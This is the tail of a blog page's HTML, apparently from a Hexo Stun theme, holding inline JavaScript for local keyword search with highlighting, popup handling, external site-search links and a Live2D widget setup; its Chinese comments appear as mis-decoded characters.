
  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // å°† XML è½¬ä¸º JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // æœç´¢å¯¹è±¡ï¼ˆæ ‡é¢˜ã€å†…å®¹ï¼‰çš„æƒé‡ï¼Œå½±å“æ˜¾ç¤ºé¡ºåº
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // æ ¹æ®ç©ºç™½å­—ç¬¦åˆ†éš”å…³é”®å­—
        var keywords = searchText.split(/[\s]+/);
        // æœç´¢ç»“æœ
        var matchPosts = [];

        // æœ‰å¤šä¸ªå…³é”®å­—æ—¶ï¼Œå°†åŸæ–‡å­—æ•´ä¸ªä¿å­˜ä¸‹æ¥
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // é˜²æ­¢æœªè¾“å…¥å­—ç¬¦æ—¶æœç´¢
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // æ²¡æœ‰æ ‡é¢˜çš„æ–‡ç« ä½¿ç”¨é¢„è®¾çš„ i18n å˜é‡ä»£æ›¿
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // åˆ é™¤ HTML æ ‡ç­¾ å’Œ æ‰€æœ‰ç©ºç™½å­—ç¬¦
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // åˆ é™¤é‡å¤çš„ /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // æ ‡é¢˜ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var titleHitSlice = [];
            // å†…å®¹ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * è·å–åŒ¹é…çš„å…³é”®è¯çš„ç´¢å¼•
              * @param {String} keyword è¦åŒ¹é…çš„å…³é”®å­—
              * @param {String} text åŸæ–‡å­—
              * @param {Boolean} caseSensitive æ˜¯å¦åŒºåˆ†å¤§å°å†™
              * @param {Number} weight åŒ¹é…å¯¹è±¡çš„æƒé‡ã€‚æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // æ¯æ¬¡åŒ¹é…çš„å¼€å§‹ç´¢å¼•
                var index = -1;     // åŒ¹é…åˆ°çš„ç´¢å¼•å€¼
                var result = [];    // åŒ¹é…ç»“æœ

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // ç´¢å¼•ä½ç½®ç›¸åŒçš„å…³é”®è¯ï¼Œä¿ç•™é•¿åº¦è¾ƒé•¿çš„
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // æŒ‰ç…§åŒ¹é…æ–‡å­—çš„ç´¢å¼•çš„é€’å¢é¡ºåºæ’åº
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * ç»™æ–‡æœ¬ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯æ·»åŠ æ ‡è®°ï¼Œä»è€Œè¿›è¡Œé«˜äº®æ˜¾ç¤º
              * @param {String} text åŸæ–‡æœ¬
              * @param {Array} hitSlice åŒ¹é…é¡¹çš„ç´¢å¼•ä¿¡æ¯
              * @param {Number} start å¼€å§‹ç´¢å¼•
              * @param {Number} end ç»“æŸç´¢å¼•
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // æ–‡ç« æ€»çš„æœç´¢æƒé‡
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„æ ‡é¢˜
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„å†…å®¹
              var postContent;
              // æ˜¾ç¤ºå†…å®¹çš„é•¿åº¦
              var SHOW_WORD_LENGTH = 200;
              // å‘½ä¸­å…³é”®è¯å‰çš„å­—ç¬¦æ˜¾ç¤ºé•¿åº¦
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // æˆªå–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå‰åå…± 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // æœªåŒ¹é…åˆ°å†…å®¹ï¼Œç›´æ¥æˆªå–å‰ 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // æŒ‰æƒé‡é€’å¢çš„é¡ºåºæ’åºï¼Œä½¿æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>